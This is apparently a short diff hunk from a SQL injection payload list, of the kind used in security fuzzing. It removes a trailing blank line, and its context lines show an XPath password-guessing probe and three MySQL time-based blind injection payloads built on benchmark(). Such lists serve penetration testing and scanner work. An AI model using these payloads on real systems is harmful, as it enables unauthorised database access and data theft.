@@ -1817,4 +1817,3 @@ admin' and substring(password/text(),1,1)='7
 ")))) and 0=benchmark(3000000,MD5(1))%20/*
 ")))) and 0=benchmark(3000000,MD5(1))%20--
 ")))) and 0=benchmark(3000000,MD5(1))%20%23
-
